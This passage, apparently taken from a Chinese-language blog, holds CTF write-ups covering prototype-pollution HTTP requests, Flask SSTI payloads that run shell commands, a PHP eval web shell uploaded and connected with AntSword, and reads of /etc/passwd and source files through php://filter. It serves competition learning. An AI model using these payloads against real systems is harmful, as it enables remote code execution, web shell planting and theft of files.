class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中&#x2F;api&#x2F;v1&#x2F;sell存在<code>原型链污染</code></p><p>第一步，通过链污染修改<code>req.session.admin为true</code>，覆盖flags的price为1</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144112916.png" alt="image-20220721144112916"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/sell HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">48</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;__proto__&quot;:&#123;&quot;admin&quot;:true&#125;,&quot;flags&quot;:&#123;&quot;price&quot;:1&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721143941235.png" alt="image-20220721143941235"></p><p>造成的结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144203842.png" alt="image-20220721144203842"></p><p>第二步，直接购买flags，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/buy HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">32</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;product&quot;:&quot;flags&quot;,&quot;quantity&quot;:1&#125;</span></span><br></pre></td></tr></table></figure><p><img src="E:\markdown\img\image-20220721144002542-16613913650561.png" alt="image-20220721144002542"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> BDSecCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImaginaryCTF2022-Web</title>
      <link href="/2022/07/19/ImaginaryCTF2022-Web/"/>
      <url>/2022/07/19/ImaginaryCTF2022-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="ImaginaryCTF2022"><a href="#ImaginaryCTF2022" class="headerlink" title="ImaginaryCTF2022"></a>ImaginaryCTF2022</h1><p>[toc]</p><p>平台链接：<a href="https://2022.imaginaryctf.org/">Home Page - ImaginaryCTF</a></p><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><p>瞎点，出现了</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719225522358.png" alt="image-20220719225522358"></p><p>然后搜索alert，发现这个东西</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220716231559412.png" alt="image-20220716231559412"></p><p>控制台执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">motSusfunclion</span>()</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719101656785.png" alt="image-20220719101656785"></p><h2 id="rooCookie"><a href="#rooCookie" class="headerlink" title="rooCookie"></a>rooCookie</h2><p>关键代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createToken</span>(<span class="params">text</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text.<span class="property">length</span>; i++) &#123;</span><br><span class="line">encrypted += ((text[i].<span class="title function_">charCodeAt</span>(<span class="number">0</span>)-<span class="number">43</span>+<span class="number">1337</span>) &gt;&gt; <span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">2</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">cookie</span> = encrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;tokenquot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>已知的是加密后的数据，我们根据这个信息来写逆向解密脚本</p><p>相关函数</p><p>charCodeAt() 方法可返回指定位置的字符的 Unicode 编码。这个返回值是 0 - 65535 之间的整数。</p><p>根据可显示字符对应的是32到127左右的字符，同时-43+1337也就是+1294，所以可以根据这个判断转为二进制后，都是11位的二进制字符串</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719004344083.png" alt="image-20220719004344083"></p><p>然后写逆向脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut_text</span>(<span class="params">text,lenth</span>):</span><br><span class="line">  textArr = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(lenth)+<span class="string">&#x27;&#125;&#x27;</span>, text)</span><br><span class="line">  textArr.append(text[(<span class="built_in">len</span>(textArr)*lenth):])</span><br><span class="line">  <span class="keyword">return</span> textArr</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">token = <span class="string">&#xx27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cut_text(token,<span class="number">11</span>)) <span class="comment"># 分为57个长度为11的二进制字符串</span></span><br><span class="line"></span><br><span class="line">s = cut_text(token,<span class="number">11</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">  a = <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)-<span class="number">1294</span>)</span><br><span class="line">  flag += a</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719004426066.png" alt="image-20220719004426066"></p><p>username&#x3D;”roo” &amp; password&#x3D;”ictf{h0p3_7ha7_wa5n7_t00_b4d}”</p><h2 id="minigolf"><a href="#minigolf" class="headerlink" title="minigolf"></a>minigolf</h2><p>题目很明显，flask模板注入，但是过滤了<code>[&quot;&#123;&#123;", "&#125;&#125;&quot;, &quot;[&quot;, &quot;]&quot;, &quot;_&quot;]</code>，同时字符串长度限制了69</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;_&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">  <span class="built_in">print</span>(request.args)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> request.args.keys():</span><br><span class="line">    txt = html.escape(request.args[<span class="string">&quot;txt&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([n <span class="keyword">in</span> txt <span class="keyword">for</span> n <span class="keyword">in</span> blacklist]):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(txt) &lt;= <span class="number">69</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template_string(txt)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Too long.&quot;</span></span><br><span class="line">  <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>使用config.update</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%20config.update(a=request.args.a)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="keyword">if</span>%20config.update(g=request.args.g)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;g=ls</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719203914568.png" alt="image-20220719203914568"></p><p>然后将第二个修改为<code>cat flag.txt</code></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%20config.update(a=request.args.a)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="keyword">if</span>%20config.update(g=request.args.g)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;g=cat%20flag.txt</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719204058013.png" alt="image-20220719204058013"></p><h2 id="Democracy"><a href="#Democracy" class="headerlink" title="Democracy"></a>Democracy</h2><p>直接就显示flag了</p><p><code>ictf&#123;i&#39;m_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...&#125;</code></p><h2 id="SSTI-Golf"><a href="#SSTI-Golf" class="headerlink" title="SSTI Golf"></a>SSTI Golf</h2><p>python的模板注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;query&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">else</span> <span class="string">&#x27;...&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">48</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;7*7&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>回显49</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;lipsum.__globals__.os.popen(%27whoami%27).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>回显root，将命令换为<code>cat *</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;lipsum.__globals__.os.popen(%27cat%20*%27).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220718223727617.png" alt="image-20220718223727617"></p><p>ictf{F!1+3r5s!?}</p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用<code>config.update</code>，将相关函数写入config中</p><p>本题因为限制了字符串长度，所以使用即可</p><p>下面这个已知修改config中a的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(a=lipsum)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].__builtins__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].<span class="built_in">eval</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;config.a(request.args.b)&#125;&#125;&amp;b=<span class="built_in">__import__</span>(%27os%<span class="number">27</span>).popen(%27<span class="built_in">id</span>%<span class="number">27</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719202212921.png" alt="image-20220719202212921"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(&#123;<span class="string">&quot;a&quot;</span>:cycler.__init__&#125;)&#125;&#125;</span><br><span class="line">&#123;&#123;config.a.__globals__.os.popen(<span class="string">&quot;nl%20*&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719202324050.png" alt="image-20220719202324050"></p><p>下面这个题目不是该比赛中的题目，是这个平台daily challenge里面的一个题目</p><h2 id="daliy-challenge"><a href="#daliy-challenge" class="headerlink" title="daliy challenge"></a>daliy challenge</h2><h3 id="Almost-SSTI"><a href="#Almost-SSTI" class="headerlink" title="Almost SSTI"></a>Almost SSTI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3002</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>debug模式是开启的，构造报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//puzzler7.imaginaryctf.org:3002/ssti?query[]=</span></span><br><span class="line"><span class="title function_ invoke__">__import__</span>(<span class="string">&quot;os&quot;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls&quot;</span>).read</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719225636877.png" alt="image-20220719225636877"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ImaginaryCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年蓝贝国际创新创业大赛数字技术+信息安全领域赛道网络攻防大赛wp</title>
      <link href="/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/"/>
      <url>/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年蓝贝国际创新创业大赛“数字技术-信息安全领域赛道网络攻防大赛”wp"><a href="#2022年蓝贝国际创新创业大赛“数字技术-信息安全领域赛道网络攻防大赛”wp" class="headerlink" title="2022年蓝贝国际创新创业大赛“数字技术+信息安全领域赛道网络攻防大赛”wp"></a>2022年蓝贝国际创新创业大赛“数字技术+信息安全领域赛道网络攻防大赛”wp</h1><h2 id="mine"><a href="#mine" class="headerlink" title="mine"></a>mine</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353647.png" alt="img"></p><p>注意观察这个符号，对应的是src.js中的res&#x2F;face_normal.bmp</p><p>进行查找别的face，发现有face_success.bmp</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353993.png" alt="img"></p><p>首先进行hex解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353310.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LJWXQ2C2GN2FKYKXGVXGGMTIGFGUQTJQMIZHQ3CJK42GQYKHKZ2VIQ2GN5MVGRTKJVKEEMSZLBFDS===</span><br></pre></td></tr></table></figure><p>然后进行base32解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353317.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tUaW5nc2h1MHM0b2xlIW4haGVuTCFoYSFjMTB2YXJ9</span><br></pre></td></tr></table></figure><p>然后进行base64解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353893.png" alt="img"></p><p>flag{Tingshu0s4ole!n!henL!ha!c10var}</p><h2 id="cook"><a href="#cook" class="headerlink" title="cook"></a>cook</h2><p>查看cookie</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353837.png" alt="img"></p><p>然后访问7815696ecbf1c96e6894b779456d330e.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353401.png" alt="img"></p><p>flag{c7a4c2050907de3b70c519287f171f35}</p><h2 id="upload-inc"><a href="#upload-inc" class="headerlink" title="upload-inc"></a>upload-inc</h2><p>查看源码，提示include.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353475.png" alt="img"></p><p>然后访问include.php，查看源码：提示upload.php和参数为file</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353880.png" alt="img"></p><p>似乎是原题<a href="http://danyhug.gitee.io/blog/2021/01/05/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8-%E7%AD%BE%E5%88%B0%E8%88%AC%E7%9A%84%E5%8C%85%E5%90%AB/">第十一周 | 签到般的包含 | Danyhug’s Blog (gitee.io)</a></p><p>整一个1.php，写一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行压缩，将压缩文件后缀改为png</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353108.png" alt="img"></p><p>进行文件上传</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353621.png" alt="img"></p><p>然后蚁剑连接</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353921.png" alt="image-20220715172645597"></p><h2 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h2><p>找到登录界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353471.png" alt="img"></p><p>按照这个做一遍，弱密码登录</p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122236773">typesetter 文件上传（CVE-2020-25790）_xzhome的博客-CSDN博客</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353215.png" alt="image-20220715201703774"></p><p>然后上传木马1.zip，加压，然后蚁剑直接连接</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353087.png" alt="img"></p><p>找到flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152354803.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2022-web-会聊天的机器人</title>
      <link href="/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2022-华东北-会聊天的机器人"><a href="#CISCN2022-华东北-会聊天的机器人" class="headerlink" title="CISCN2022-华东北-会聊天的机器人"></a>CISCN2022-华东北-会聊天的机器人</h1><p>可以上传词库规则，然后和机器人对话，就会去进行查找，并且回复</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;你好&quot;</span>: &#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;你好ctfer！&quot;</span>&#125;, <span class="string">&quot;1&quot;</span>: &#123;<span class="string">&quot;image&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>&#125;, <span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;calc&quot;</span>:<span class="string">&quot;1+1&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p>这里注意iamge，我们可以传入一个图片的链接，然后机器人会去访问，并且返回，所以我们这里尝试访问<code>/etc/passwd</code>，进行base64解码就可以获取</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142134821.png" alt="image-20220714192927092"></p><p>所以尝试任意文件读取，但是不能读取&#x2F;flag，可能是路径问题，或者权限问题</p><p>继续看calc功能，尝试一下，回显<code>admin才能使用这个功能</code></p><p>还是那个读取文件的东西，使用php伪协议读取api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/var/www/html/api.php</span></span><br></pre></td></tr></table></figure><p>得到api.php</p><figure 